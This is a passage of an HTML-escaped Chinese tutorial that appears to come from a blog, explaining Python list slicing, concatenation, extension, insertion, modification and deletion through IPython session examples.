&lt;p&gt;如上面代码所示，切片的操作为：列表[开始:结束:间隔] ，间隔默认为1，可以省略不写。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;注意：切片的两个索引取左不取右，也就是是说，左闭右开&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;来看更灵活的使用方法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;59&quot;&gt;
&lt;pre&gt;
In [21]: systems = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;22]: systems[2:5]          &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 获取索引为2到5的元素，不包括5&lt;/span&gt;
Out[22]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]


In [&lt;/span&gt;24]: systems[2:-1]         &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 获取索引为2到-1的元素，不包括-1&lt;/span&gt;
Out[24]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;25]: systems[0:5]          &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 获取开头元素到索引为5的元素，不包括5&lt;/span&gt;
Out[25]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;26]: systems[:5]           &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 从开头取的话可以将0忽略，效果与上句一样&lt;/span&gt;
Out[26]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;28]: systems[2:]           &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 结尾是列表的最后一个元素时，必须省略不写，写-1的话就取不到最后一个元素了&lt;/span&gt;
Out[28]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;29]: systems[:]            &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 获取全部元素&lt;/span&gt;
Out[29]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;30]: systems[1:5:2]        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 获取索引为1到5的元素，并且每隔一个元素取一个，不包括5&lt;/span&gt;
Out[30]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;31]: systems[::2]          &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 从全部元素中每隔一个取一个&lt;/span&gt;
Out[31]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;一定要熟练掌握上述方法&lt;/p&gt;
&lt;h4&gt;4.列表组合&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;列表相加：&lt;/strong&gt;将不同的列表用 + 号加起来，效果如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
In [32]: name1 = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;MinuteSheep&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Mike&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;33]: name2 = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;BigBan&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Heenoor&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;34]: name1 +&lt;span&gt; name2
Out[&lt;/span&gt;34]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;MinuteSheep&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Mike&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;BigBan&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Heenoor&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;列表扩展：&lt;/strong&gt;上面列表相加并没有改变原有列表的元素，name1 + name2 是一个新的列表，可以传给变量 name3；而列表的扩展将直接改变被扩展列表：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
In [35]: name3 = name1 + name2   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 将name1+name2传给变量name3&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;36]: name3                   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 可以看到name3是一个新列表&lt;/span&gt;
Out[36]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;MinuteSheep&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Mike&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;BigBan&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Heenoor&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;37]: name1                   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; name1列表并没有被改变&lt;/span&gt;
Out[37]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;MinuteSheep&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Mike&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;38]: name2                   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; name2列表并没有被改变&lt;/span&gt;
Out[38]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;BigBan&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Heenoor&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;39]: name1.extend(name2)     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 用name2扩展name1，使用extemd()方法&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;40]: name1                   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 可以看到name1列表被改变，因为name1是被扩展列表&lt;/span&gt;
Out[40]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;MinuteSheep&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Mike&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;BigBan&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Heenoor&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;41]: name2                   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; name2列表并没有被改变或者删除&lt;/span&gt;
Out[41]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;BigBan&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Heenoor&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;列表乘法：&lt;/strong&gt;将一个列表与一个数字 n 相乘，得到一个 n 倍元素的新列表：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;52&quot;&gt;
&lt;pre&gt;
In [44&lt;span&gt;]: systems
Out[&lt;/span&gt;44]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;45]: systems * 3&lt;span&gt;
Out[&lt;/span&gt;45&lt;span&gt;]:
[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, 'Windows&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;Ubuntu&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;IOS&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;Android&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;5.插入元素&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;追加：&lt;/strong&gt;在列表末尾插入一个新的元素：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
In [46&lt;span&gt;]: systems
Out[&lt;/span&gt;46]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;47]: systems.append(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)      &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 使用append()方法追加&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;48&lt;span&gt;]: systems
Out[&lt;/span&gt;48]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;任意位置插入：&lt;/strong&gt;在列表的任意位置插入新元素，之前存在元素的位置向后加一：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
In [48&lt;span&gt;]: systems
Out[&lt;/span&gt;48]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;49]: systems.insert(3,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Dos&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 使用 insert(位置,新元素名称) 方法插入新元素&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;50&lt;span&gt;]: systems
Out[&lt;/span&gt;50]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Dos&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;6.修改列表&lt;/h4&gt;
&lt;p&gt;直接将被修改的元素重新赋值即可：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
In [50&lt;span&gt;]: systems
Out[&lt;/span&gt;50]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Dos&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;51]: systems[3&lt;span&gt;]
Out[&lt;/span&gt;51]: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Dos&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;

In [&lt;/span&gt;52]: systems[3]= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;我是之前的Dos，我被修改了&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 直接将被修改元素重新赋值即可&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;53&lt;span&gt;]: systems
Out[&lt;/span&gt;53]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;我是之前的Dos，我被修改了&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;7.删除元素&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;删除最后一个元素：&lt;/strong&gt;将列表的末尾元素删除：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
In [53&lt;span&gt;]: systems
Out[&lt;/span&gt;53]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;我是之前的Dos，我被修改了&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;54]: systems.pop()      &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 使用pop()方法删除末尾元素，并且返回末尾元素&lt;/span&gt;
Out[54]: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;

In [&lt;/span&gt;55&lt;span&gt;]: systems
Out[&lt;/span&gt;55]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;我是之前的Dos，我被修改了&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;删除任意位置元素：&lt;/strong&gt;将列表中任意位置的元素删除：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
In [55&lt;span&gt;]: systems
Out[&lt;/span&gt;55]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;我是之前的Dos，我被修改了&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;56]: &lt;span&gt;del&lt;/span&gt; systems[3]     &lt;span&gt;# &lt;/span&gt;&lt;span&gt;使用 del 命令删除元素&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;57&lt;span&gt;]: systems
Out[&lt;/span&gt;57]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;删除指定元素：&lt;/strong&gt;删除列表中指定的元素，不通过索引删除，直接通过元素的名称删除：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
In [57&lt;span&gt;]: systems
Out[&lt;/span&gt;57]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;58]: systems.remove(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 使用remove()方法删除指定元素&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;59&lt;span&gt;]: systems
Out[&lt;/span&gt;59]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;列表清空：&lt;/strong&gt;将列表清空，列表依然存在，直是没有元素而已，是一个空列表：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
In [59&lt;span&gt;]: systems
Out[&lt;/span&gt;59]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;60]: systems.clear()        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 使用clear()方法将列表清空&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;61&lt;span&gt;]: systems
Out[&lt;/span&gt;61]: []
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;8.列表统计&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;统计列表长度：&lt;/strong&gt;使用len()统计列表中元素的个数：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
